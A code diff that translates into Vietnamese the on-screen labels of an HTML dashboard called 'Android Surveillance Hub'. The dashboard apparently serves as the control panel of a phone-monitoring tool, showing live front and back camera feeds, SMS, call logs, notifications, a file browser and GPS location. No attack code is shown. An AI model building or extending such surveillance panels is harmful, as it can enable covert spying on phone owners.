@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Surveillance Hub</title>
+    <title>Trung Tâm Giám Sát Android</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
         * {
@@ -593,26 +593,26 @@
         <div class="ash-hud">
             <!-- Left Column -->
             <div class="ash-left">
-                <div id="ash-stage1">• Acquiring Link</div>
-                <div id="ash-stage2">• Handshake — Authorization</div>
-                <div id="ash-stage3">• Stabilizing Channel</div>
-                <div id="ash-stage4">• Connected</div>
+                <div id="ash-stage1">• Đang Kết Nối</div>
+                <div id="ash-stage2">• Xác Thực — Ủy Quyền</div>
+                <div id="ash-stage3">• Ổn Định Kênh Truyền</div>
+                <div id="ash-stage4">• Đã Kết Nối</div>
             </div>
 
             <!-- Center Orb + Status -->
             <div class="ash-center">
                 <div class="ash-orb"></div>
-                <div class="ash-status">INITIALIZING…</div>
-                <div class="ash-status">ACQUIRING LINK</div>
-                <div class="ash-status">HANDSHAKE — AUTHORIZATION</div>
-                <div class="ash-status">STABILIZING CHANNEL</div>
-                <div class="ash-status">CONNECTED — SECURE SESSION ACTIVE</div>
+                <div class="ash-status">KHỞI ĐỘNG…</div>
+                <div class="ash-status">ĐANG KẾT NỐI</div>
+                <div class="ash-status">XÁC THỰC — ỦY QUYỀN</div>
+                <div class="ash-status">ỔN ĐỊNH KÊNH TRUYỀN</div>
+                <div class="ash-status">ĐÃ KẾT NỐI — PHIÊN BẢO MẬT HOẠT ĐỘNG</div>
                 <div class="ash-progress"><div class="ash-ring"></div></div>
             </div>
 
             <!-- Right Column -->
             <div class="ash-right">
-                <div class="ash-tile">SIGNAL:</div>
+                <div class="ash-tile">TÍN HIỆU:</div>
                 <div class="ash-bars">
                     <div class="ash-bar"></div>
                     <div class="ash-bar"></div>
@@ -620,17 +620,17 @@
                     <div class="ash-bar"></div>
                     <div class="ash-bar"></div>
                 </div>
-                <div class="ash-tile ash-latency">LATENCY: 014 ms</div>
-                <div class="ash-tile">PATH: ROUTE • (obfuscated)</div>
+                <div class="ash-tile ash-latency">ĐỘ TRỄ: 014 ms</div>
+                <div class="ash-tile">ĐƯỜNG DẪN: TUYẾN • (ẩn danh)</div>
             </div>
         </div>
     </div>
     <!-- /Cinematic Loader Overlay -->
 
     <div class="header">
-        <h1>Android Surveillance Hub</h1>
-        <div id="status">Connecting to server...</div>
-        <button id="retryButton">Retry Connection</button>
+        <h1>Trung Tâm Giám Sát Android</h1>
+        <div id="status">Đang kết nối tới máy chủ...</div>
+        <button id="retryButton">Thử Lại Kết Nối</button>
     </div>
     
     <div class="main-content">
@@ -638,15 +638,15 @@
             <div class="video-section">
                 <div class="video-container">
                     <div class="video-header">
-                        <h2>Live Front Camera Feed</h2>
-                        <div class="live-indicator">● LIVE</div>
+                        <h2>Camera Trước Trực Tiếp</h2>
+                        <div class="live-indicator">● TRỰC TIẾP</div>
                     </div>
                     <video id="remoteVideoFront" class="remote-video" autoplay playsinline></video>
                 </div>
                 <div class="video-container">
                     <div class="video-header">
-                        <h2>Live Back Camera Feed</h2>
-                        <div class="live-indicator">● LIVE</div>
+                        <h2>Camera Sau Trực Tiếp</h2>
+                        <div class="live-indicator">● TRỰC TIẾP</div>
                     </div>
                     <video id="remoteVideoBack" class="remote-video" autoplay playsinline></video>
                 </div>
@@ -658,7 +658,7 @@
                     <div class="card notifications-card flex max-h-50 overflow-y-auto">
                         <h2>
                             <div class="card-icon">🔔</div>
-                            Notifications
+                            Thông Báo
                         </h2>
                         <div id="notifications">
                             <div id="notificationList"></div>
@@ -671,7 +671,7 @@
                     <div class="card call-logs-card flex max-h-100 overflow-y-auto">
                         <h2>
                             <div class="card-icon">📞</div>
-                            Call Logs
+                            Nhật Ký Cuộc Gọi
                         </h2>
                         <div id="callLogs">
                             <div id="callLogList"></div>
@@ -681,7 +681,7 @@
                     <div class="card sms-messages-card flex max-h-100 overflow-y-auto">
                         <h2>
                             <div class="card-icon">💬</div>
-                            SMS Messages
+                            Tin Nhắn SMS
                         </h2>
                         <div id="smsMessages">
                             <div id="smsList"></div>
@@ -694,15 +694,15 @@
                     <div class="card file-explorer-card" style="height: 500px; display: flex; flex-direction: column;">
                         <h2>
                             <div class="card-icon">📂</div>
-                            File Explorer
+                            Quản Lý Tệp
                         </h2>
                         <div style="margin-bottom: 10px; display: flex; gap: 10px;">
-                            <button id="fsBackBtn" style="padding: 4px 12px; background: #374151; color: #fff; border: 1px solid #4b5563; border-radius: 4px; cursor: pointer;">⬆ Up</button>
+                            <button id="fsBackBtn" style="padding: 4px 12px; background: #374151; color: #fff; border: 1px solid #4b5563; border-radius: 4px; cursor: pointer;">⬆ Lên</button>
                             <input type="text" id="fsPathInput" value="/storage/emulated/0/" style="flex: 1; background: #111827; border: 1px solid #374151; color: #00ff00; padding: 4px 8px; border-radius: 4px; font-family: monospace;">
-                            <button id="fsGoBtn" style="padding: 4px 12px; background: #059669; color: #fff; border: none; border-radius: 4px; cursor: pointer;">Go</button>
+                            <button id="fsGoBtn" style="padding: 4px 12px; background: #059669; color: #fff; border: none; border-radius: 4px; cursor: pointer;">Đi</button>
                         </div>
                         <div id="fileList" style="flex: 1; overflow-y: auto; background: #111827; border: 1px solid #374151; border-radius: 8px; padding: 10px;">
-                            <div style="color: #6b7280; text-align: center; margin-top: 20px;">Connect to device to list files</div>
+                            <div style="color: #6b7280; text-align: center; margin-top: 20px;">Kết nối thiết bị để xem danh sách tệp</div>
                         </div>
                     </div>
                 </div>
@@ -712,7 +712,7 @@
                     <div id="map" class="gps-location-card">
                         <h2>
                             <div class="card-icon">📍</div>
-                            GPS Location
+                            Vị Trí GPS
                         </h2>
                         <div id="mapContainer"></div>
                     </div>
@@ -721,7 +721,7 @@
                 <!-- Row 4: Debug Logs -->
                 <div class="row single">
                     <div id="debugLog" class="debug-log-card">
-                        <h2>Debug Log</h2>
+                        <h2>Nhật Ký Hệ Thống</h2>
                         <div id="logMessages"></div>
                     </div>
                 </div>
